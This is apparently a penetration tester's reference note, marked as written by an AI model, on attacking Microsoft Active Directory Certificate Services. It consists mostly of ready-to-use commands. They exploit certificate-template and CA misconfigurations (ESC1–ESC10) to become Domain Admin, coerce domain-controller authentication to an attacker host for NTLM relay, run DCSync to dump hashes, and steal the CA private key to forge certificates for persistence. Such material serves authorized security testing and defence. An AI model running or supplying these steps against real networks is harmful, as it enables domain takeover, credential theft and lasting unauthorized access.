# ADCS

#ADCS #ActiveDirectoryCertificateServices #certificates #ESC #Certipy #PKI

## What is ADCS?

Active Directory Certificate Services — Microsoft PKI implementation. Issues digital certificates for auth, encryption, and code signing. Misconfigurations in certificate templates and CA settings allow privilege escalation to Domain Admin via certificate-based authentication (PKINIT). Primary attack research: SpecterOps "Certified Pre-Owned" (2021).

- **Web Enrollment**: TCP 80/443 — `http://<CA>/certsrv/`
- **RPC/DCOM**: TCP 135 + dynamic — certificate enrollment via RPC
- **LDAP**: TCP 389 — template and CA object enumeration
- CA server is typically a dedicated server or the DC itself

---

## Key Concepts

| Term | Description |
|---|---|
| CA | Certificate Authority — issues certificates |
| Root CA | Top of PKI chain — trust anchor |
| Subordinate CA | Issues certs on behalf of Root CA |
| Certificate Template | Blueprint defining what a cert can be used for |
| EKU | Extended Key Usage — defines allowed cert purposes |
| SAN | Subject Alternative Name — alternate identities in cert |
| PKINIT | Kerberos extension for certificate-based auth |
| NTLM Relay | Relay auth to `/certsrv/` endpoint for cert issuance |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/AD/Certipy\|Certipy]] | Primary Linux tool — enumerate templates/CAs, request/forge certificates, PKINIT auth |
| Certify.exe | Windows C# enumeration/request tool ([GhostPack](https://github.com/GhostPack/Certify)) — no vault note yet |
| [[Tools/Lateral Movement/Rubeus\|Rubeus]] | Windows — request TGT from a certificate, inject ticket |
| PKINITtools | Linux PKINIT auth scripts, `gettgtpkinit.py` / `getnthash.py` ([dirkjanm](https://github.com/dirkjanm/PKINITtools)) — no vault note yet |
| [[Tools/Lateral Movement/impacket\|impacket]] | `secretsdump.py`, general post-cert tooling |
| [[Tools/Lateral Movement/ntlmrelayx\|ntlmrelayx]] | Relay coerced NTLM auth to the CA Web Enrollment endpoint (ESC8) |
| [[Tools/Credential Dumping/secretsdump\|secretsdump]] | DCSync using a recovered machine-account hash |
| [[Tools/Auth/impacket-psexec\|impacket-psexec]] | PtH/PtT shell after obtaining a cert-derived hash or ticket |
| [[Tools/Lateral Movement/Evil WinRM\|evil-winrm]] | WinRM shell using a cert-derived NT hash |
| PetitPotam.py | Coerce NTLM auth (MS-EFSRPC, unauth on unpatched) for ESC8 — no vault note yet |
| printerbug.py | Coerce NTLM auth (MS-RPRN) for ESC8 — no vault note yet; see [[Tools/Lateral Movement/Coercer\|Coercer]] for a maintained multi-technique alternative |

---

## Enumeration

```bash
# Certipy — find all vulnerabilities in one shot
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip>
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -json
certipy find -u <user>@<domain> -hashes :<NTLM> -dc-ip <dc_ip> -vulnerable -stdout

# Certify.exe (Windows)
.\Certify.exe cas                           # enumerate CAs
.\Certify.exe find                          # all templates
.\Certify.exe find /vulnerable             # only vulnerable templates
.\Certify.exe find /vulnerable /currentuser

# List certificate templates via LDAP
ldapsearch -H ldap://<dc_ip> -x -D "<user>@<domain>" -w '<pass>' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pkiExtendedKeyUsage
```

---

## Connect / Access

Once any technique below yields a certificate (`Administrator.pfx` etc.), this is how you turn it into a usable session.

### Linux (Certipy + PKINITtools)

```bash
# Option A — certipy auth (simplest)
certipy auth -pfx Administrator.pfx -dc-ip <dc_ip>
# Outputs: TGT (.ccache) + NT hash

# Option B — PKINITtools (manual)
python3 gettgtpkinit.py -cert-pfx Administrator.pfx <domain>/Administrator Administrator.ccache
export KRB5CCNAME=Administrator.ccache
python3 getnthash.py -key <AS_REP_key> <domain>/Administrator

# Use TGT
export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass
impacket-secretsdump <domain>/Administrator@<dc_ip> -k -no-pass
```

### Windows (Rubeus)

```powershell
# Convert PEM cert to PFX (if needed)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Get TGT from cert
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<pfx_pass> /ptt

# Verify TGT injected
klist

# Access target
dir \\<dc_hostname>\C$
.\PsExec.exe \\<dc_hostname> cmd.exe
```

### Using the recovered NT hash instead of a ticket

```bash
impacket-psexec <domain>/Administrator@<target> -hashes :<NT_hash>
evil-winrm -i <target> -u Administrator -H <NT_hash>
```

---

## Attack Vectors

### ESC1 — Misconfigured Certificate Template (SAN Specification)

**Conditions:** template allows enrollee to specify SAN, EKU includes Client Authentication (or Smart Card Logon / Any Purpose), low-privileged users can enroll.

```bash
# Certipy — request cert as Domain Admin
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' \
  -template '<Vulnerable_Template>' \
  -upn Administrator@<domain>
# Output: Administrator.pfx — see Connect / Access above to use it

# Certify.exe + Rubeus (Windows)
.\Certify.exe request /ca:<domain>\<CA_Name> /template:<Template> /altname:Administrator
# Save output as cert.pem, convert:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<pfx_pass> /ptt
```

### ESC2 — Any Purpose / No EKU Template

**Conditions:** template has Any Purpose EKU, or no EKU at all; low-privileged users can enroll.

```bash
# Same exploitation path as ESC1 — request cert, specify SAN
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template '<Template>' -upn Administrator@<domain>
certipy auth -pfx Administrator.pfx -dc-ip <dc_ip>
```

### ESC3 — Enrollment Agent Template Abuse

**Conditions:** one template has the Certificate Request Agent EKU with low-priv enrollment; a second template allows an enrollment agent to enroll on behalf of another user.

```bash
# Step 1: Get enrollment agent certificate
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template '<EnrollmentAgent_Template>'
# Output: <user>.pfx

# Step 2: Use enrollment agent cert to request cert on behalf of DA
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template '<Template2>' \
  -on-behalf-of '<domain>\Administrator' \
  -pfx <user>.pfx
# Output: Administrator.pfx
```

### ESC4 — Write Access on Certificate Template

**Conditions:** low-privileged user has write permissions on a template object.

```bash
# Certipy — modify template to enable SAN specification (make it ESC1)
certipy template -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -template '<Template>' -save-old

# Now exploit as ESC1
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template '<Template>' -upn Administrator@<domain>
certipy auth -pfx Administrator.pfx -dc-ip <dc_ip>

# Restore template after
certipy template -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -template '<Template>' -configuration <saved_config>
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA

**Conditions:** CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set, allowing SAN specification in *any* certificate request regardless of template settings.

```bash
# Exploit — request cert with SAN using any enrollable template
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template User -upn Administrator@<domain>
certipy auth -pfx Administrator.pfx -dc-ip <dc_ip>

# Certify.exe (Windows)
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:<domain>\<CA_Name> /template:User /altname:Administrator
```

### ESC7 — Vulnerable CA Access Control

**Conditions:** user has `Manage CA` or `Manage Certificates` permission on the CA.

```bash
# Step 1: Request cert for DA (will fail/be pending) — note the request ID
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -template SubCA -upn Administrator@<domain>

# Step 2: Issue the denied request (requires Manage Certificates)
certipy ca -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -issue-request <request_id>

# Step 3: Retrieve the issued cert
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
  -ca '<CA_Name>' -retrieve <request_id>
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoint

**Conditions:** Web Enrollment (`/certsrv/`) or CES endpoint exposed, NTLM auth enabled (default), attacker can coerce NTLM auth from `DC$` or another machine account.

```bash
# Step 1: Set up relay targeting the CA Web Enrollment endpoint
sudo impacket-ntlmrelayx -t http://<CA_host>/certsrv/certfnsh.asp \
  --adcs --template DomainController
# or for workstations:
sudo impacket-ntlmrelayx -t http://<CA_host>/certsrv/certfnsh.asp \
  --adcs --template Machine

# Step 2: Coerce DC authentication to attacker
# PrinterBug (MS-RPRN)
python3 printerbug.py <domain>/<user>:<pass>@<dc_ip> <attacker_ip>

# PetitPotam (MS-EFSRPC — no auth required on unpatched)
python3 PetitPotam.py -u '' -p '' <attacker_ip> <dc_ip>
python3 PetitPotam.py -u <user> -p '<pass>' <attacker_ip> <dc_ip>

# Step 3: ntlmrelayx outputs base64 cert — save as DC.pfx
echo '<base64>' | base64 -d > DC.pfx

# Step 4: Auth as DC$ → DCSync
certipy auth -pfx DC.pfx -dc-ip <dc_ip>
# Gets NT hash of DC$ computer account

impacket-secretsdump -hashes :<DC_NT_hash> '<domain>/DC$'@<dc_ip>
```

### ESC9 / ESC10 — Weak Certificate Mappings (Newer)

```bash
# ESC9: No security extension — userPrincipalName change attack
# ESC10: Weak certificate mapping — GenericWrite on user → change UPN → request cert → restore UPN → auth

# Certipy handles both
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
# Follow certipy output guidance for ESC9/10 exploitation steps
```

### Post-DA — CA Key Theft & Certificate Forging

Once you have Domain Admin (via any ESC above), the CA itself can be turned into a persistence/forging mechanism.

```bash
# Certipy — list all issued certs (useful for finding other users' certs)
certipy ca -u Administrator@<domain> -hashes :<hash> -dc-ip <dc_ip> -ca '<CA_Name>' -list-requests

# Dump CA private key (allows forging any cert offline)
certipy ca -u Administrator@<domain> -hashes :<hash> -dc-ip <dc_ip> -ca '<CA_Name>' -backup
# Output: <CA_Name>.pfx (CA cert + private key)

# Forge cert using stolen CA key
certipy forge -ca-pfx '<CA_Name>.pfx' -upn Administrator@<domain> -subject 'CN=Administrator'
certipy auth -pfx Administrator_forged.pfx -dc-ip <dc_ip>
```

---

## Dangerous Settings

| Setting | ESC | Risk |
|---|---|---|
| Template allows SAN + Client Auth EKU + low-priv enroll | ESC1 | Cert as any user → DA |
| Any Purpose / No EKU on enrollable template | ESC2 | Same as ESC1 |
| Enrollment Agent template accessible | ESC3 | Enroll on behalf of DA |
| Write perms on template object | ESC4 | Modify template → ESC1 |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | ESC6 | SAN on any cert request |
| Manage CA / Manage Certs perms | ESC7 | Issue arbitrary certs |
| Web Enrollment with NTLM + coercible auth | ESC8 | Relay DC auth → DC cert → DCSync |

---

## Quick Reference

| Goal | Command |
|---|---|
| Find vulns | `certipy find -u user@domain -p pass -dc-ip dc -vulnerable -stdout` |
| ESC1/2/6 exploit | `certipy req -u user@domain -p pass -dc-ip dc -ca CA -template Tmpl -upn Administrator@domain` |
| Authenticate with cert | `certipy auth -pfx Administrator.pfx -dc-ip dc` |
| ESC8 relay setup | `impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController` |
| Coerce auth (PetitPotam) | `python3 PetitPotam.py attacker_ip dc_ip` |
| Coerce auth (PrinterBug) | `python3 printerbug.py domain/user:pass@dc_ip attacker_ip` |
| Backup CA key | `certipy ca -u Admin@domain -hashes :hash -dc-ip dc -ca CA -backup` |
| Forge cert | `certipy forge -ca-pfx CA.pfx -upn Administrator@domain` |
| DCSync post-ESC8 | `impacket-secretsdump -hashes :DC_hash 'domain/DC$'@dc_ip` |

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
